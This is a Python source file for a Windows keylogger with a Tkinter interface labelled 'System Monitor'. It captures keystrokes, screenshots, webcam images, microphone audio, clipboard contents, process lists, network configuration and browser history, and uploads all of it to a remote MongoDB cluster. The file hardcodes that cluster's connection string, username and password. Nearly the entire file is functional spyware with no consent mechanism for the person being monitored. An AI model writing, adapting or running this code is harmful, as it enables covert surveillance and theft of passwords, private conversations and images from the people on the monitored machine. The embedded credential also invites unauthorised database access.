import subprocess
import socket
import win32clipboard
import os
import re
import smtplib
import logging
import pathlib
import json
import time
import cv2
import sounddevice
import shutil
import requests
import socket
import platform
import uuid
import base64
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import queue
import io
from datetime import datetime
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
import pymongo
from pymongo import MongoClient
import sys

# MongoDB connection details
MONGO_URI = "mongodb+srv://rounakchatterjee501:rounak501@cluster0.zouzehl.mongodb.net/"
DB_NAME = "keylogger_db"

# Queue for thread-safe logging
log_queue = queue.Queue()

# Global settings
active = False
user_id = None
log_path = 'C:\\Users\\Public\\Logs\\'

# Process tracking
processes = []

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Monitor")
        self.root.geometry("400x450")
        self.root.resizable(False, False)
        
        # Main frame
        self.main_frame = ttk.Frame(root, padding="20")
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Status indicator
        self.status_frame = ttk.LabelFrame(self.main_frame, text="Status")
        self.status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.status_label = ttk.Label(self.status_frame, text="Inactive", foreground="red")
        self.status_label.pack(padx=10, pady=10)
        
        # Controls
        self.control_frame = ttk.LabelFrame(self.main_frame, text="Controls")
        self.control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.start_btn = ttk.Button(self.control_frame, text="Start Monitoring", command=self.start_monitoring)
        self.start_btn.pack(fill=tk.X, padx=10, pady=5)
        
        self.stop_btn = ttk.Button(self.control_frame, text="Stop Monitoring", command=self.stop_monitoring, state=tk.DISABLED)
        self.stop_btn.pack(fill=tk.X, padx=10, pady=5)
        
        # Options frame
        self.options_frame = ttk.LabelFrame(self.main_frame, text="Monitoring Options")
        self.options_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Checkboxes for options
        self.keylog_var = tk.BooleanVar(value=True)
        self.screenshot_var = tk.BooleanVar(value=True)
        self.webcam_var = tk.BooleanVar(value=True)
        self.mic_var = tk.BooleanVar(value=True)
        self.system_var = tk.BooleanVar(value=True)
        self.browser_var = tk.BooleanVar(value=True)
        
        self.keylog_check = ttk.Checkbutton(self.options_frame, text="Keyboard Logging", variable=self.keylog_var)
        self.keylog_check.grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.screenshot_check = ttk.Checkbutton(self.options_frame, text="Screenshot Capture", variable=self.screenshot_var)
        self.screenshot_check.grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.webcam_check = ttk.Checkbutton(self.options_frame, text="Webcam Capture", variable=self.webcam_var)
        self.webcam_check.grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        
        self.mic_check = ttk.Checkbutton(self.options_frame, text="Microphone Recording", variable=self.mic_var)
        self.mic_check.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)
        
        self.system_check = ttk.Checkbutton(self.options_frame, text="System Info", variable=self.system_var)
        self.system_check.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        
        self.browser_check = ttk.Checkbutton(self.options_frame, text="Browser History", variable=self.browser_var)
        self.browser_check.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        
        # Log output area
        self.log_frame = ttk.LabelFrame(self.main_frame, text="Activity Log")
        self.log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = tk.Text(self.log_frame, height=8, width=40)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.config(state=tk.DISABLED)
        
        # Scrollbar for log
        self.scrollbar = ttk.Scrollbar(self.log_text, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=self.scrollbar.set)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Start log consumer thread
        self.log_thread = threading.Thread(target=self.consume_logs, daemon=True)
        self.log_thread.start()
        
        # Add a closing protocol
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
    def on_closing(self):
        """Handle window close event"""
        if active:
            if messagebox.askyesno("Confirmation", "Monitoring is still active. Do you want to stop it and exit?"):
                self.stop_monitoring()
                self.root.destroy()
        else:
            self.root.destroy()
    
    def log_message(self, message):
        """Add a message to the log queue"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        log_queue.put(log_entry)
    
    def consume_logs(self):
        """Consume log messages from the queue and display them"""
        while True:
            try:
                message = log_queue.get(timeout=0.1)
                self.log_text.config(state=tk.NORMAL)
                self.log_text.insert(tk.END, message + "\n")
                self.log_text.see(tk.END)
                self.log_text.config(state=tk.DISABLED)
                log_queue.task_done()
            except queue.Empty:
                time.sleep(0.1)
            except Exception as e:
                print(f"Error in log consumer: {str(e)}")
    
    def start_monitoring(self):
        """Start the monitoring processes"""
        global active, processes, user_id
        
        if active:
            return
            
        try:
            # Test MongoDB connection first
            self.log_message("Testing database connection...")
            client = MongoClient(MONGO_URI)
            db = client[DB_NAME]
            db.list_collection_names()  # This will fail if connection fails
            
            # Register the user/system
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            os_info = platform.platform()
            
            # Generate or retrieve user_id
            user_id = self.register_user(hostname, ip_address, os_info)
            if not user_id:
                messagebox.showerror("Error", "Failed to register system with the database.")
                return
                
            # Ensure log directory exists
            pathlib.Path(log_path).mkdir(parents=True, exist_ok=True)
            pathlib.Path(log_path + 'Screenshots').mkdir(parents=True, exist_ok=True)
            pathlib.Path(log_path + 'WebcamPics').mkdir(parents=True, exist_ok=True)
            
            # Start selected monitoring processes
            active = True
            
            # Update UI
            self.status_label.config(text="Active - Monitoring", foreground="green")
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            
            # Disable checkboxes
            for check in [self.keylog_check, self.screenshot_check, self.webcam_check, 
                          self.mic_check, self.system_check, self.browser_check]:
                check.config(state=tk.DISABLED)
            
            # Start the appropriate processes based on selected options
            processes = []
            
            if self.system_var.get():
                # Collect system info right away
                self.log_message("Collecting system information...")
                system_thread = threading.Thread(target=collect_system_info)
                system_thread.daemon = True
                system_thread.start()
            
            if self.browser_var.get():
                # Collect browser history right away
                self.log_message("Collecting browser history...")
                browser_thread = threading.Thread(target=collect_browser_history)
                browser_thread.daemon = True
                browser_thread.start()
            
            if self.keylog_var.get():
                self.log_message("Starting keylogger...")
                p1 = Process(target=logg_keys, args=(log_path,))
                p1.daemon = True
                p1.start()
                processes.append(p1)
            
            if self.screenshot_var.get():
                self.log_message("Starting screenshot capture...")
                p2 = Process(target=screenshot, args=(log_path,))
                p2.daemon = True
                p2.start()
                processes.append(p2)
            
            if self.mic_var.get():
                self.log_message("Starting microphone recording...")
                p3 = Process(target=microphone, args=(log_path,))
                p3.daemon = True
                p3.start()
                processes.append(p3)
            
            if self.webcam_var.get():
                self.log_message("Starting webcam capture...")
                p4 = Process(target=webcam, args=(log_path,))
                p4.daemon = True
                p4.start()
                processes.append(p4)
                
            self.log_message(f"Monitoring active for system ID: {user_id}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start monitoring: {str(e)}")
            self.log_message(f"Error: {str(e)}")
    
    def stop_monitoring(self):
        """Stop all monitoring processes"""
        global active, processes
        
        if not active:
            return
            
        try:
            # Terminate all processes
            for p in processes:
                try:
                    p.terminate()
                except:
                    pass
                    
            processes = []
            active = False
            
            # Update UI
            self.status_label.config(text="Inactive", foreground="red")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            
            # Enable checkboxes
            for check in [self.keylog_check, self.screenshot_check, self.webcam_check, 
                          self.mic_check, self.system_check, self.browser_check]:
                check.config(state=tk.NORMAL)
                
            self.log_message("Monitoring stopped")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop monitoring: {str(e)}")
            self.log_message(f"Error: {str(e)}")
    
    def register_user(self, hostname, ip_address, os_info):
        """Register the system with MongoDB and get a user_id"""
        try:
            client = MongoClient(MONGO_URI)
            db = client[DB_NAME]
            users_collection = db["tracked_users"]
            
            # Check if this hostname is already registered
            existing_user = users_collection.find_one({"hostname": hostname})
            
            if existing_user:
                return existing_user["user_id"]
            
            # Generate a new user_id
            user_id = str(uuid.uuid4())
            
            # Insert new user record
            user_data = {
                "user_id": user_id,
                "hostname": hostname,
                "ip_address": ip_address,
                "os_info": os_info,
                "first_seen": datetime.now(),
                "last_active": datetime.now()
            }
            
            users_collection.insert_one(user_data)
            return user_id
            
        except Exception as e:
            self.log_message(f"Error registering system: {str(e)}")
            return None

# MongoDB functions
def save_keylog_to_db(keylog_text):
    """Save keylog data to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        keylogs_collection = db["key_logs"]
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "keylog_data": keylog_text
        }
        
        keylogs_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving keylog to database: {str(e)}")
        return False

def save_screenshot_to_db(image_path):
    """Save screenshot to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        screenshots_collection = db["screenshots"]
        
        # Read the image file
        with open(image_path, "rb") as img_file:
            img_data = img_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "image_data": img_data
        }
        
        screenshots_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving screenshot to database: {str(e)}")
        return False

def save_webcam_to_db(image_path):
    """Save webcam picture to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        webcam_collection = db["webcam_pics"]
        
        # Read the image file
        with open(image_path, "rb") as img_file:
            img_data = img_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "image_data": img_data
        }
        
        webcam_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving webcam picture to database: {str(e)}")
        return False

def save_audio_to_db(audio_path):
    """Save audio recording to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        mic_collection = db["mic_recordings"]
        
        # Read the audio file
        with open(audio_path, "rb") as audio_file:
            audio_data = audio_file.read()
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "audio_data": audio_data
        }
        
        mic_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving audio recording to database: {str(e)}")
        return False

def save_system_info_to_db(system_info):
    """Save system information to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        system_info_collection = db["system_info"]
        
        # Check if we already have system info for this user
        existing = system_info_collection.find_one({"user_id": user_id})
        
        if existing:
            # Update existing record
            system_info_collection.update_one(
                {"user_id": user_id},
                {
                    "$set": {
                        "system_info": system_info,
                        "updated_at": datetime.now()
                    }
                }
            )
        else:
            # Create new record
            document = {
                "user_id": user_id,
                "system_info": system_info,
                "created_at": datetime.now(),
                "updated_at": datetime.now()
            }
            system_info_collection.insert_one(document)
            
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving system info to database: {str(e)}")
        return False

def save_browser_history_to_db(browser_history):
    """Save browser history to MongoDB"""
    try:
        if not user_id:
            return False
            
        client = MongoClient(MONGO_URI)
        db = client[DB_NAME]
        browser_history_collection = db["browser_history"]
        
        document = {
            "user_id": user_id,
            "timestamp": datetime.now(),
            "browser_data": browser_history
        }
        
        browser_history_collection.insert_one(document)
        
        # Update user's last active timestamp
        db["tracked_users"].update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now()}}
        )
        
        return True
    except Exception as e:
        log_queue.put(f"Error saving browser history to database: {str(e)}")
        return False

# Keylogging function
class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.keylog_buffer = ""
        self.last_upload_time = time.time()
    
    def on_press(self, key):
        try:
            # Format the current time
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Append to log file
            with open(self.log_file, 'a') as f:
                f.write(f'{current_time}: {key}\n')
            
            # Append to buffer for periodic DB upload
            self.keylog_buffer += f'{current_time}: {key}\n'
            
            # Every 10 seconds or if buffer gets large, upload to DB
            if time.time() - self.last_upload_time > 10 or len(self.keylog_buffer) > 1024:
                if user_id:
                    save_keylog_to_db(self.keylog_buffer)
                self.keylog_buffer = ""
                self.last_upload_time = time.time()
                
        except Exception as e:
            log_queue.put(f"Keylogger error: {str(e)}")

def logg_keys(file_path):
    try:
        log_file = file_path + 'key_logs.txt'
        
        # Create a KeyLogger instance
        keylogger = KeyLogger(log_file)
        
        # Start listening for key presses
        with Listener(on_press=keylogger.on_press) as listener:
            listener.join()
            
    except Exception as e:
        log_queue.put(f"Keylogger process error: {str(e)}")

# Screenshot capture function
def screenshot(file_path):
    try:
        screenshots_dir = file_path + 'Screenshots\\'
        pathlib.Path(screenshots_dir).mkdir(parents=True, exist_ok=True)
        
        count = 0
        while active:
            try:
                # Capture the screen
                pic = ImageGrab.grab()
                pic_path = screenshots_dir + f'screenshot{count}.png'
                pic.save(pic_path)
                
                # Upload to MongoDB
                if user_id:
                    save_screenshot_to_db(pic_path)
                
                count += 1
                time.sleep(10)  # Take screenshot every 10 seconds
            except Exception as e:
                log_queue.put(f"Screenshot error: {str(e)}")
                time.sleep(10)  # Continue despite errors
                
    except Exception as e:
        log_queue.put(f"Screenshot process error: {str(e)}")

# Microphone recording function
def microphone(file_path):
    try:
        count = 0
        while active:
            try:
                # Set up recording parameters
                fs = 44100  # Sample rate
                seconds = 10  # Duration of recording
                
                # Record audio
                recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
                sounddevice.wait()  # Wait until recording is finished
                
                # Save the recording
                audio_path = file_path + f'{count}mic_recording.wav'
                write_rec(audio_path, fs, recording)
                
                # Upload to MongoDB
                if user_id:
                    save_audio_to_db(audio_path)
                
                count += 1
                time.sleep(5)  # Pause between recordings
            except Exception as e:
                log_queue.put(f"Microphone error: {str(e)}")
                time.sleep(10)  # Continue despite errors
                
    except Exception as e:
        log_queue.put(f"Microphone process error: {str(e)}")

# Webcam capture function
def webcam(file_path):
    try:
        webcam_dir = file_path + 'WebcamPics\\'
        pathlib.Path(webcam_dir).mkdir(parents=True, exist_ok=True)
        
        count = 0
        
        # Try to open the webcam
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            log_queue.put("Could not access webcam")
            return
            
        while active:
            try:
                # Capture frame from webcam
                ret, img = cam.read()
                if not ret:
                    log_queue.put("Failed to capture webcam image")
                    time.sleep(10)
                    continue
                    
                # Save the image
                img_path = webcam_dir + f'{count}.jpg'
                cv2.imwrite(img_path, img)
                
                # Upload to MongoDB
                if user_id:
                    save_webcam_to_db(img_path)
                
                count += 1
                time.sleep(15)  # Take picture every 15 seconds
            except Exception as e:
                log_queue.put(f"Webcam error: {str(e)}")
                time.sleep(10)  # Continue despite errors
                
        # Release the webcam
        cam.release()
            
    except Exception as e:
        log_queue.put(f"Webcam process error: {str(e)}")

# System information collection
def collect_system_info():
    try:
        system_info = {}
        
        # Get basic system info
        system_info["hostname"] = socket.gethostname()
        system_info["ip_address"] = socket.gethostbyname(system_info["hostname"])
        
        try:
            system_info["public_ip"] = requests.get('https://api.ipify.org').text
        except:
            system_info["public_ip"] = "Could not determine"
            
        system_info["os"] = platform.system()
        system_info["os_release"] = platform.release()
        system_info["os_version"] = platform.version()
        system_info["architecture"] = platform.machine()
        system_info["processor"] = platform.processor()
        
        # Get network interfaces
        system_info["network_info"] = {}
        try:
            # Run ipconfig command and capture output
            ipconfig = subprocess.check_output("ipconfig /all", shell=True).decode('utf-8', errors='ignore')
            system_info["network_info"]["ipconfig"] = ipconfig
        except:
            system_info["network_info"]["ipconfig"] = "Failed to retrieve"
            
        # Get running processes
        system_info["processes"] = {}
        try:
            # Run tasklist command and capture output
            tasklist = subprocess.check_output("tasklist", shell=True).decode('utf-8', errors='ignore')
            system_info["processes"]["tasklist"] = tasklist
        except:
            system_info["processes"]["tasklist"] = "Failed to retrieve"
        
        # Clipboard content
        system_info["clipboard"] = {}
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                system_info["clipboard"]["text"] = clipboard_data
            else:
                system_info["clipboard"]["text"] = "No text in clipboard"
            win32clipboard.CloseClipboard()
        except:
            system_info["clipboard"]["text"] = "Failed to retrieve"
        
        # Save to local file
        with open(log_path + 'system_info.txt', 'w') as f:
            f.write(json.dumps(system_info, indent=2))
        
        # Upload to MongoDB
        if user_id:
            save_system_info_to_db(system_info)
            
        log_queue.put("System information collected and uploaded")
        
        return system_info
        
    except Exception as e:
        log_queue.put(f"System info collection error: {str(e)}")
        return None

# Browser history collection
def collect_browser_history():
    try:
        # Import browserhistory module for this function only
        import browserhistory as bh
        
        # Get browser history
        browser_data = []
        
        try:
            # Get username
            username = bh.get_username()
            browser_data.append(username)
            
            # Get database paths
            db_paths = bh.get_database_paths()
            browser_data.append(db_paths)
            
            # Get history
            history = bh.get_browserhistory()
            browser_data.append(history)
            
        except Exception as e:
            log_queue.put(f"Error getting browser history details: {str(e)}")
            browser_data = ["Error retrieving browser history"]
        
        # Save to local file
        with open(log_path + 'browser.txt', 'w') as f:
            f.write(json.dumps(browser_data))
        
        # Upload to MongoDB
        if user_id:
            save_browser_history_to_db(browser_data)
            
        log_queue.put("Browser history collected and uploaded")
        
        return browser_data
        
    except ImportError:
        log_queue.put("Browser history module not available")
        return None
    except Exception as e:
        log_queue.put(f"Browser history collection error: {str(e)}")
        return None

# Main function
def main():
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()